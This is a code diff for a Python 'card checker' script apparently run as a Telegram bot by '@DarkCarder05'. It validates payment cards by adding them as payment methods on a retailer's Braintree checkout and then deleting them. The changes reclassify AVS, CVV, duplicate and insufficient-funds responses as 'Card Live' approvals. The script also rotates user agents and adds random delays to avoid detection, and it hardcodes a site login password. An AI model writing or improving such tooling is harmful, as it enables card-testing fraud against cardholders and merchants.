@@ -1,8 +1,7 @@
 """
-Woolroots B3 Checker v8 — Final
+Woolroots B3 Checker v9
 Owner: @DarkCarder05
-Token: 8031306974 (as given)
-No proxy. Multi-nonce fix. Live UI.
+AVS / Duplicate / Insufficient = Approved (Card Live)
 """
 import os, re, time, base64, random, uuid, threading, logging, itertools
 from threading import Lock
@@ -33,7 +32,6 @@ LOGIN_PASS  = "90901212Aa@"
 
 DELAY_MIN = 3
 DELAY_MAX = 7
-PROXY_MAX_RETRIES = 1
 
 # ═══════════════════════════════════════════════════════════
 # PROXIES — DISABLED
@@ -79,7 +77,7 @@ def masked_proxy(p):
 UAS = [
     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/15E148 Safari/604.1",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
 ]
@@ -418,14 +416,17 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
         if "errors" in j:
             err_str = str(j["errors"]).lower()
             if "cvv" in err_str or "security code" in err_str:
-                log("❌ <b>Stage:</b> 🚫 CVV mismatch")
-                return _ok("declined", "CVV_MISMATCH", cc, base)
+                log("✅ <b>Stage:</b> 💎 CVV (Card Live)")
+                return _ok("approved", "CVV_MISMATCH (Card Live)", cc, base)
             if "expired" in err_str or "expiration" in err_str:
                 log("❌ <b>Stage:</b> 🚫 Expired card")
                 return _ok("declined", "EXPIRED_CARD", cc, base)
             if "invalid" in err_str or "not a valid" in err_str or "invalid number" in err_str:
                 log("❌ <b>Stage:</b> 🚫 Invalid card number")
                 return _ok("declined", "INVALID_CARD", cc, base)
+            if "insufficient" in err_str or "not enough" in err_str:
+                log("✅ <b>Stage:</b> 💎 Insufficient (Card Live)")
+                return _ok("approved", "INSUFFICIENT_FUNDS (Card Live)", cc, base)
             log("❌ <b>Stage:</b> 🚫 " + err_str[:40])
             return _ok("declined", "BT: " + err_str[:60], cc, base)
 
@@ -450,7 +451,6 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
             log("💀 <b>Stage:</b> 🚫 Nonce not found")
             return _err("NO_ADD_NONCE", base)
 
-        logger.info("Nonce extracted: " + str(add_nonce)[:20] + "...")
         log("📤 <b>Stage:</b> 💾 Posting card...")
 
         r = s.post(
@@ -491,39 +491,62 @@ def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
                     break
         low = (msg + " " + r.text[:1200]).lower()
 
+        # ═══════════════════════════════════════════
+        # APPROVED LOGIC
+        # ═══════════════════════════════════════════
         added = any(k in low for k in ["new payment method added", "payment method successfully added", "successfully added"])
-        if added:
-            log("✅ <b>Stage:</b> 💎 Card ADDED — cleaning up")
-            r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
-            del_url = extract_delete_link(r2.text, SITE)
+        avs_reject = "gateway rejected" in low and "avs" in low
+        duplicate = "duplicate card exists" in low
+        insufficient = "insufficient" in low or "not enough" in low
+        cvv_reject = "gateway rejected" in low and ("cvv" in low or "cvc" in low)
+        avs_reject_2 = "avs" in low and "rejected" in low
+
+        approved = added or avs_reject or duplicate or insufficient or cvv_reject or avs_reject_2
+
+        if approved:
+            if added:
+                label = "CARD ADDED"
+            elif avs_reject or avs_reject_2:
+                label = "AVS (Card Live)"
+            elif duplicate:
+                label = "DUPLICATE (Card Live)"
+            elif insufficient:
+                label = "INSUFFICIENT (Card Live)"
+            elif cvv_reject:
+                label = "CVV (Card Live)"
+            else:
+                label = "APPROVED"
+
+            log("✅ <b>Stage:</b> 💎 " + label)
+
             deleted = None
             del_msg = ""
-            if del_url:
-                ok_del, del_msg = delete_payment_method(s, del_url)
-                deleted = bool(ok_del)
-            else:
-                deleted = False
-                del_msg = "no link"
+            if added:
+                r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
+                del_url = extract_delete_link(r2.text, SITE)
+                if del_url:
+                    ok_del, del_msg = delete_payment_method(s, del_url)
+                    deleted = bool(ok_del)
+                else:
+                    deleted = False
+                    del_msg = "no link"
             base["deleted"] = deleted
             base["delete_msg"] = del_msg
-            return _ok("approved", msg or "CARD ADDED", cc, base)
+            return _ok("approved", label, cc, base)
 
-        if "duplicate card exists" in low:
-            log("❌ <b>Stage:</b> 🚫 Duplicate card")
-            return _ok("declined", "DUPLICATE_CARD", cc, base)
-        if "insufficient" in low or "not enough" in low:
-            log("❌ <b>Stage:</b> 🚫 Insufficient funds")
-            return _ok("declined", "INSUFFICIENT_FUNDS", cc, base)
-        if "cvv" in low or "security code" in low:
-            log("❌ <b>Stage:</b> 🚫 CVV mismatch")
-            return _ok("declined", "CVV_MISMATCH", cc, base)
-        if "gateway rejected" in low and "avs" in low:
-            log("❌ <b>Stage:</b> 🚫 Gateway rejected (AVS)")
-            return _ok("declined", "GATEWAY_REJECTED:AVS", cc, base)
+        # ═══════════════════════════════════════════
+        # DECLINED
+        # ═══════════════════════════════════════════
         if "risk" in low or "fraud" in low:
             log("⚠️ <b>Stage:</b> 🛡 Risk flagged")
-            return _ok("declined", msg[:100] or "RISK", cc, base)
-        if any(k in low for k in ["declined", "invalid", "expired", "failed", "error"]):
+            return _ok("risk", msg[:100] or "RISK", cc, base)
+        if "expired" in low:
+            log("❌ <b>Stage:</b> 🚫 Expired")
+            return _ok("declined", "EXPIRED_CARD", cc, base)
+        if "invalid" in low:
+            log("❌ <b>Stage:</b> 🚫 Invalid")
+            return _ok("declined", "INVALID_CARD", cc, base)
+        if any(k in low for k in ["declined", "failed", "error", "rejected"]):
             log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
             return _ok("declined", msg[:100] or "DECLINED", cc, base)
         log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
@@ -691,7 +714,7 @@ def run_check(chat_id, cards):
             err += 1
 
         if r["status"] == "approved":
-            final_stage = "💎 <b>Stage:</b> ✅ ADDED & DELETED"
+            final_stage = "💎 <b>Stage:</b> ✅ " + str(r["response"])[:30]
         elif r["status"] == "declined":
             final_stage = "❌ <b>Stage:</b> 🚫 " + str(r["response"])[:40]
         elif r["status"] == "risk":
